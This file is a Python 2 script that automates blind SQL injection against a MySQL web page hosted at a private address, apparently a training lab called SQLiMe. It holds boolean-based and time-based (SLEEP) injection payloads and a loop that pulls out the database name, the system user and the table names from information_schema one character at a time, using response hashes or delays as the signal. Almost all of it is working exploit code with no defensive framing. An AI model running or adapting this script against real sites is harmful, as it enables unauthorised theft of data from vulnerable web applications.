import urllib2, sys, urllib, hashlib, argparse

#function opening connection
def OpenUrlConnection (base_url,blind_sqli_url):
    #decodeURI
    #text = urllib.unquote(text.encode('ascii')).decode('utf-8')
    #encodeURI
    #text = urllib.quote(text.encode('utf-8'))
    blind_sqli_url_q = urllib.quote_plus(blind_sqli_url)
    url = base_url + blind_sqli_url_q
    
    url_request = urllib2.Request(url)
    try: 
        url_response = urllib2.urlopen(url_request)
    except urllib2.HTTPError, e:
        print'HTTPError = ' + str(e.code)
    except urllib2.URLError, e:
        print 'URLError = ' + str(e.reason)
    return (url_response.read())

def BlindSqli(base_url, payload, multiple_values):
    character_position = 1
    multivalue_position = 1
    multivalue_indicator = 1
    flag_finish = False
    string_append = ""
    #range function starts from the next number that you type. We need to start the ascii_decimal_num = 32 so we assign range from 31
    #print "Find_SystemUser 1"
    while (flag_finish != True):
        
        for ascii_decimal_num in range(32,127):
            #print payload % (str(character_position),str(ascii_decimal_num))
            if multiple_values == True:
                blind_sqli_url =  payload % (str(character_position),str(multivalue_position),str(ascii_decimal_num))
                #print blind_sqli_url
            else:
                blind_sqli_url =  payload % (str(character_position),str(ascii_decimal_num))
            #
            result_url_content = OpenUrlConnection(base_url,blind_sqli_url)
            
            if (hash_url(result_url_content) == false_url_hash):
                character = chr(ascii_decimal_num)
                character_position +=1
                
                if ascii_decimal_num == 32:
                    #
                    if multiple_values == False:
                        #
                        flag_finish = True
                        break
                    #if multiple values is set to True then
                    elif multiple_values == True:
                        #
                        if multivalue_indicator >1:
                            #
                            flag_finish = True
                            break 
                        character_position = 1
                        multivalue_position += 1
                        multivalue_indicator += 1  
                    print ""                      
                else:
                    sys.stdout.write(character)
                    string_append += character 
                break
            else:
                ascii_decimal_num +=1
                multivalue_indicator = 1
    return string_append
                
   

def hash_url(url):
    url_hash= hashlib.md5()
    url_hash.update(url)
    return url_hash.digest()

#calculate two hash functions on the string of the OpenUrlConnection. The returned string is the content
#of the website. 
global false_url_hash
"""
parser = argparse.ArgumentParser(description="calculate X to the power of Y")
#parser.add_argument("-u", "--url", action="store_true", dest = "target_url", help="Specify which SQL injection type to test for. T: Time-based blind,B: Boolean-based blind")
#parser.add_argument("-t", "--technique", action="store", choices = ['T', 'B'], dest = "technique", help="Specify which SQL injection type to test for. T: Time-based blind,B: Boolean-based blind")
#parser.add_argument("--tables", action="store", dest = "tables", help = "Enumerate DBMS database tables")
#parser.add_argument("-d", "--database", action="store", dest = "database", help = "Enumerate DBMS database tables")
#parser.add_argument("-su", "--system-user", action="store", dest = "system_user", help = "Enumerate DBMS database tables")
parser.add_argument('--version', action='version', version='%(prog)s 1.0')
args = parser.parse_args()

#....
if args.target_url:
    base_url = args.target_url
else:
    print "Run -h or --help to ...."
"""

base_url = "http://192.168.2.7/SQLiMe/Lesson02/index.php?id=1"
false_url_hash = hash_url(OpenUrlConnection(base_url, " AND false"))

enum = 'dump_tables'
technique = 'B'

#PATTERN ~1 " AND ORD(MID((IFNULL(CAST("+mysql_command+" AS CHAR),CHAR(32))),%s,1)) > %s"
#PATTERN ~2 " AND ASCII(SUBSTRING("+mysql_command+",%s,1))> %s"
if enum == 'database':
    multiple_values = False
    mysql_command = 'database()'
    if technique == 'B':
        payload = " AND ASCII(SUBSTRING("+mysql_command+",%s,1))> %s"
    elif technique == 'T':
        payload = " AND 928 = IF(ASCII(SUBSTRING("+mysql_command+",%s,1))> %s,928,SLEEP(2))"
elif enum == 'system_user':
    multiple_values = False
    mysql_command = 'system_user()'
    if technique == 'B':
        payload = " AND ASCII(SUBSTRING("+mysql_command+",%s,1))> %s"
    elif technique == 'T':
        payload = " AND 928 = IF(ASCII(SUBSTRING("+mysql_command+",%s,1))> %s,928,SLEEP(2))"
elif enum == 'dump_tables':
    multiple_values = True
    payload = " AND ASCII(SUBSTRING(DATABASE(),%s,1))> %s"
    db_name = "0x"+BlindSqli(base_url, payload, False).encode("hex")
    print ""
    if technique == 'B':
        payload = " AND (select ASCII(SUBSTRING(a.table_name,%s,1)) FROM (select table_name, @rownum:=@rownum+1 as rownum from information_schema.tables, (select @rownum:=0)r WHERE table_schema="+db_name+")a where a.rownum=%s)>%s"
    elif technique == 'T':
        payload = " AND 928 = IF((select ASCII(SUBSTRING(a.table_name,%s,1)) FROM (select table_name, @rownum:=@rownum+1 as rownum from information_schema.tables, (select @rownum:=0)r WHERE table_schema=0x4C30324442)a where a.rownum=%s)>%s,928,SLEEP(2))"

#Set if the funtion BlisdSqli needs to run for mulitple values
print BlindSqli(base_url, payload, multiple_values)